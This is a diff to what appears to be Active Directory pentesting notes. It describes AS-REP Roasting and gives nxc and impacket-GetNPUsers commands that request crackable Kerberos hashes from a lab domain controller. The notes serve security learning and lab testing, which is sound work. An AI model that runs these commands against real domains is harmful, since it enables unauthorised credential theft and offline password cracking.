@@ -295,13 +295,21 @@ Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supp
 
 ---------------
 
-- AS-REP Roasting is an Active Directory attack technique that targets user accounts configured without Kerberos pre-authentication. When pre-authentication is disabled, an attacker may be able to request authentication response material for the account and attempt to crack the encrypted response offline.
+- AS-REP Roasting is an Active Directory attack technique that targets user accounts configured without Kerberos pre-authentication. When pre-authentication is disabled, an attacker may be able to request authentication response material for the account and attempt to crack the encrypted response offline.Nxc
 
 ```bash
 nxc ldap  192.168.232.129  -u valid_ad_username -p '' --asreproast valid_asrep_roast.txt
 ```
 
 <img width="1894" height="376" alt="image" src="https://github.com/user-attachments/assets/11f68f6e-f996-416d-b792-01374c870e3b" />
+
+- Using `impacket-GETNPUsers`-:
+
+```bash
+impacket-GetNPUsers cs.org/ -usersfile valid_ad_username -dc-ip 192.168.232.129 -request -format john
+```
+
+<img width="1900" height="855" alt="image" src="https://github.com/user-attachments/assets/05df868a-3178-4016-b38d-319e451d9006" />
 
 
 
